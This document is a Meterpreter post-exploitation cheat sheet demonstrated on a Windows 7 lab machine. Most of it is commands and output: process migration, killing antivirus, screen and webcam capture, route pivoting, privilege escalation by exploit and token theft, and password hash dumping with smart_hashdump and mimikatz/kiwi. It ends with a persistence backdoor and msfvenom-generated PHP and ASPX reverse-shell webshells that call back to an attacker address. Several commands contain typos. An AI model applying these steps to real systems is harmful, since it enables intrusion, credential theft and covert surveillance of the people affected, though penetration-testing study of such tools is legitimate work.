---
title: meterpreter
---



# meterpreter

## View Target Processes

```shell
meterpreter > ps

Process List
============

 PID   PPID  Name                      Arch  Session  User                          Path

---   ----  ----                      ----  -------  ----                          ----

 0     0     [System Process]
 4     0     System                    x64   0
 264   4     smss.exe                  x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 316   504   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE
 348   340   csrss.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 400   340   wininit.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 412   392   csrss.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 460   392   winlogon.exe              x64   1        NT AUTHORITY\SYSTEM          C:\Windows\system32\winlogon.exe
 504   400   services.exe              x64   0        NT AUTHORITY\SYSTEM          C:\Windows\system32\services.exe
 ..................
```

## Process Migration

### Manual Migration

```shell
meterpreter > getpid  # view current process
Current pid: 1124
meterpreter > migrate 2328  # process migration
[*] Migrating from 1124 to 2328...
[*] Migration completed successfully.
meterpreter > getpid # check again to confirm successful migration
Current pid: 2328
meterpreter > kill 1124 # kill the original process
Killing: 1124
[-] 1077: Operation failed: Access is denied.
```

### Automatic Migration

```shell
meterpreter > run post/windows/manage/migrate
```

## Information Gathering

```shell
meterpreter > sysinfo # view system information
Computer        : BAJI-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

meterpreter > run post/windows/gather/checkvm # check whether it is running in a virtual machine
[*] Checking if BAJI-PC is a Virtual Machine ...
[+] This is a VMware Virtual Machine

meterpreter > idletime # check whether the machine is active and view recent idle time
User has been idle for: 9 mins 59 secs

meterpreter > getuid  # view the username of the compromised session
Server username: baji-PC\baji

meterpreter > run post/windows/manage/killav # disable antivirus software on the target
[*] No target processes were found.

meterpreter > route  # view network settings

IPv4 network routes
===================

​    Subnet           Netmask          Gateway          Metric  Interface

------           -------          -------          ------  ---------

​    0.0.0.0          0.0.0.0          192.168.160.2    10      11
​    127.0.0.0        255.0.0.0        127.0.0.1        306     1
​    127.0.0.1        255.255.255.255  127.0.0.1        306     1
​    127.255.255.255  255.255.255.255  127.0.0.1        306     1
​    192.168.160.0    255.255.255.0    192.168.160.132  266     11
​    192.168.160.132  255.255.255.255  192.168.160.132  266     11
​    192.168.160.255  255.255.255.255  192.168.160.132  266     11
​    224.0.0.0        240.0.0.0        127.0.0.1        306     1
​    224.0.0.0        240.0.0.0        192.168.160.132  266     11
​    255.255.255.255  255.255.255.255  127.0.0.1        306     1
​    255.255.255.255  255.255.255.255  192.168.160.132  266     11

No IPv6 routes were found.

meterpreter > run post/windows/gather/enum_logged_on_users # view currently logged-on users
[*] Running against session 1
Current Logged Users
====================
 SID                                             User
 ---                                             ----
 S-1-5-21-1722394881-3080478103-2565725322-1001  baji-PC\baji
[+] Results saved in: /home/zhiji/.msf4/loot/20210212153318_default_192.168.160.132_host.users.activ_894639.txt
Recently Logged Users
=====================
 SID                                             Profile Path
 ---                                             ------------
 S-1-5-18                                        %systemroot%\system32\config\systemprofile
 S-1-5-19                                        C:\Windows\ServiceProfiles\LocalService
 S-1-5-20                                        C:\Windows\ServiceProfiles\NetworkService
 S-1-5-21-1722394881-3080478103-2565725322-1001  C:\Users\baji

meterpreter > run post/windows/gather/enum_applications # view currently installed applications
[*] Enumerating applications installed on BAJI-PC
Installed Applications
======================
 Name                                                                Version
 ----                                                                -------
 Google Chrome                                                       88.0.4324.150
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2019 X64 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.20.27508         14.20.27508
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Mozilla Firefox 85.0.1 (x86 zh-CN)                                  85.0.1
 Mozilla Maintenance Service                                         85.0.1
 VMware Tools                                                        11.0.0.14549434
 phpstudy integrated environment                                     8.1.1.2
[+] Results stored in: /home/zhiji/.msf4/loot/20210212153406_default_192.168.160.132_host.application_671096.txt

meterpreter > run post/windows/gather/credentials/windows_autologin # capture auto-login usernames and passwords
[*] Running against BAJI-PC on session 1
[*] The Host BAJI-PC is not configured to have AutoLogon password

meterpreter > load espia # load the Espia plugin
Loading extension espia...Success.

meterpreter > screengrab # capture the current screen
Screenshot saved to: /home/zhiji/桌面/AaCPrqTV.jpeg  # path
meterpreter > screenshot # also capture the current screen
Screenshot saved to: /home/zhiji/桌面/RTEXARvH.jpeg  # path

meterpreter > wbcam_list # check whether the target has a camera
meterpreter > wbcam_snap # open the target camera and take a photo
meterpreter > wbcam_stream # start live streaming mode

meterpreter > shell # enter shell; use exit to quit
Process 2380 created.
Channel 2 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>
```

## Route Pivoting Settings

```shell
meterpreter > run get_local_subnets # view target subnets
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
Local subnet: 192.168.160.0/255.255.255.0

meterpreter > run autoroute -s 192.168.160.0/24  # add a route
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]                     [*] Adding a route to 192.168.160.0/255.255.255.0...
[+] Added route to 192.168.160.0/255.255.255.0 via 192.168.160.132                   [*] Use the -p option to list all active routes

meterpreter > run autoroute -p # verify that the route was added
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.              [!] Example: run post/multi/manage/autoroute OPTION=value [...]                    Active Routing Table
====================                                                                  Subnet             Netmask            Gateway
------             -------            -------
192.168.160.0      255.255.255.0      Session 1
```

## File Commands

```shell
pwd # view the current directory on the target
getlwd # view the current local directory
ls # list all directories
cd # change directory
search -f*.txt -d c:\ # search all .txt files on drive C
download c:\aa.txt /root # download target file 1.txt to /root on the attacker machine
upload /root/1.txt c:\ # upload a file to C:
```

## Privilege Escalation

### Local Exploit Privilege Escalation

1. First try privilege escalation with `getsystem`; it fails.

```shell
meterpreter > getsystem
[-] 2001: Operation failed: This function is not supported on this system. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
```

2. Use WMIC to list installed patches. These output results cannot be used directly. The usual method is to look for privilege escalation exploits and use exploits whose patch IDs do not appear in the list.

```zsh
C:\Users\baji\Desktop>Wmic qfe get Caption,Description,HotFixID,InstalledOn
Wmic qfe get Caption,Description,HotFixID,InstalledOn
Caption                                     Description  HotFixID   InstalledOn
http://support.microsoft.com/?kbid=2534111  Hotfix       KB2534111  1/4/2021
http://support.microsoft.com/?kbid=2999226  Update       KB2999226  1/4/2021
http://support.microsoft.com/?kbid=976902   Update       KB976902   11/21/2010
```

3. First move Meterpreter into the background, then search for a privilege escalation exploit. MS16-032 is used as the example here.

```shell
seach ms16_032
use 1 # 1: available module ID
set session 1 # specify session ID
run
getuid # view current privileges
```

### Token Theft Privilege Escalation

```shell
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u # list available tokens
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
baji-PC\Administrator
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token baji-PC\\Administrator # impersonate the user above; note the two backslashes between host and username
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user baji-PC\Administrator
meterpreter > shell
Process 2152 created.
Channel 2 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Users\Administrator\Desktop>whoami # view current user
whoami
baji-pc\administrator

C:\Users\Administrator\Desktop>
```

## Hash Attacks

### hashdump

Use `hashdump` to capture passwords. The Meterpreter `hashdump` script can extract hashes from the target machine; cracking the hashes can reveal login passwords.

```shell
meterpreter > getsystem # after the privilege escalation above, this command can be used for further privilege escalation
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > hashdump # hashdump must run with SYSTEM privileges, and UAC must be disabled on the target
[-] 2007: Operation failed: The parameter is incorrect.
```

For the issue above, use the more powerful `smart_hashdump` module. It can export hashes for all users and bypass UAC.

```shell
meterpreter > run windows/gather/smart_hashdump

[*] Running module against BAJI-PC
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/zhiji/.msf4/loot/20210213214048_default_192.168.160.132_windows.hashes_515778.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY be81bb778283c994c7c2ebafd8f51b04...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[+]     baji:"1"
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:69943c5e63b4d2c104dbbcc15138b72b:::
[+]     baji:1001:aad3b435b51404eeaad3b435b51404ee:69943c5e63b4d2c104dbbcc15138b72b:::
[+]     HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:59c8c6d121b9a6b2cc21bade49bfe630:::
meterpreter >
```

### kiwi

Use `kiwi` to capture passwords. Older versions of Mimikatz have been replaced by this module, which is more powerful.

The `kiwi` module supports both 32-bit and 64-bit systems. However, it loads as 32-bit by default. If the target host is 64-bit, loading the module directly by default causes many features to be unavailable. Therefore, on a 64-bit target system, first view the process list and migrate the Meterpreter process into a 64-bit process before loading `kiwi` and viewing plaintext credentials. If the target is 32-bit, this restriction does not apply.

```shell
meterpreter > getpid     # my target is 64-bit, so first migrate the process
Current pid: 2336
meterpreter > migrate 2528
[*] Migrating from 2336 to 2528...
[*] Migration completed successfully.
meterpreter > getpid    # migration succeeded
Current pid: 2528

meterpreter > load mimikatz # load the mimikatz module; it tells me it has been replaced by kiwi, so use kiwi in the future
[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > help kiwi # view help
Kiwi Commands
=============
Command                Description
-------                -----------
creds_all              # list all credentials / all system passwords
creds_kerberos         # list all Kerberos credentials
creds_msv              # list all MSV credentials
creds_ssp              # list all SSP credentials
creds_tspkg            # list all TSPKG credentials
creds_wdigest          # list all WDigest credentials
dcsync                 # retrieve user account information through DCSync
dcsync_ntlm            # retrieve NTLM hash, SID, and RID for a user account through DCSync
golden_ticket_create   # create a golden ticket
kerberos_ticket_list   # list Kerberos tickets
kerberos_ticket_purge  # purge Kerberos tickets
kerberos_ticket_use    # use Kerberos tickets
kiwi_cmd               # kiwi_cmd lets us use all Mimikatz features; append the mimikatz.exe command after it
lsa_dump_sam           # dump the LSA SAM
lsa_dump_secrets       # dump LSA secrets
password_change        # change password
wifi_list              # list Wi-Fi profiles for the current user
wifi_list_shared       # list shared Wi-Fi profiles / encodings
```

## Backdoors

### persistence Backdoor

`persistence` is a persistence backdoor that installs an autostart mechanism. It can create registry entries and files. It may trigger antivirus software on startup, so it is recommended to disable antivirus while running it in a lab.

```shell
run persistence -A -S -u -i 60 -P 4321 -r 192.168.160.132
A # automatically start the payload
S # automatically load at system startup
U # automatically start when the user logs in
X # automatically mount at startup
i # connection interval
P # listening port for reverse connection
r # target machine IP address
sessions # view successfully obtained sessions
```

### Web Backdoors

1. Meterpreter backdoor

Metasploit has a payload named PHP Meterpreter. This module can create a PHP webshell with Meterpreter functionality.

Use `msfvenom` to generate `webshell.php`.

```shell
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.160.129 -f raw > /1.php
-p is used to specify the payload; -f sets the output file format
```

Upload `1.php` to the target server. Here it is copied directly to `/var/www/html`.

Then start `msfconsole` and configure the listener with the following commands.

```shell
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.160.129
run
```

When the target visits `http://127.0.0.1/1.php`, the reverse connection succeeds.

2. ASPX Meterpreter backdoor

Metasploit has a payload named `shell_reverse_tcp`. This module can create webshells for multiple versions with Meterpreter-like functionality.

```shell
show payloads
use windows/shell_reverse_tcp
info
set lhost 192.168.160.129
set lport 4444
sava
```

```zsh
generate -t asp // generate ASP shellcode
generate -t aspx // generate ASPX shellcode
```

First save the content as `aspx.aspx`, upload it to the target server, and then start `msfconsole`.

``` shell
use expoloit/mulit/handler
set payload windows/meterpreter/reversr_tcp
set Lhost 192.168.160.120
set lport 4444
run
```

The reverse connection succeeds.
